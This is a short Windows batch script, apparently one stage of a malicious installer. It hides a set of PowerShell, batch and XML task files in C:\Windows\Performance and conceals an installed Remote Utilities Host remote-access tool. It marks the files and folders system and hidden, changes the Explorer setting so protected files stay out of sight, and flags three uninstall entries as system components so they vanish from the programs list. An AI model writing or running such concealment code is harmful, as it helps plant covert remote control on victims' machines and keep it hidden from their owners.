REM ----------------------------------------------------------------------- Invisible -------------------------------------------------------------------------------
attrib C:\Windows\Performance\importhide.bat +s +h
attrib C:\Windows\Performance\update.ps1 +s +h
attrib C:\Windows\Performance\update7.ps1 +s +h
attrib C:\Windows\Performance\hide.ps1 +s +h
attrib C:\Windows\Performance\hide.xml +s +h
attrib C:\Windows\Performance\star.bat +s +h
attrib C:\Windows\Performance\star.xml +s +h
attrib C:\Windows\Performance\startup.ps1 +s +h
attrib C:\Windows\Performance\Update.xml +s +h
attrib C:\Windows\Performance\Update7.xml +s +h
attrib C:\Windows\Performance\startup.xml +s +h
attrib +s +h "C:\Program Files (x86)\Remote Utilities - Host"
attrib "C:\Program Files (x86)\Remote Utilities - Host\rutserv.exe" +s +h
attrib "C:\Program Files (x86)\Remote Utilities - Host\rfusclient.exe" +s +h
REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v ShowSuperHidden /t REG_DWORD /d 2 /f
REG ADD "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\{E5803A4B-5A4B-44F6-A759-882FB6AD7982}" /v SystemComponent /t REG_DWORD /d 1 /f
REG ADD "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\{1E4AB2FC-B243-45C2-BF6A-A027213183CD}" /v SystemComponent /t REG_DWORD /d 1 /f
REG ADD "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\{A1341EB0-80F5-4D8D-93B6-69D738DDB559}" /v SystemComponent /t REG_DWORD /d 1 /f

exit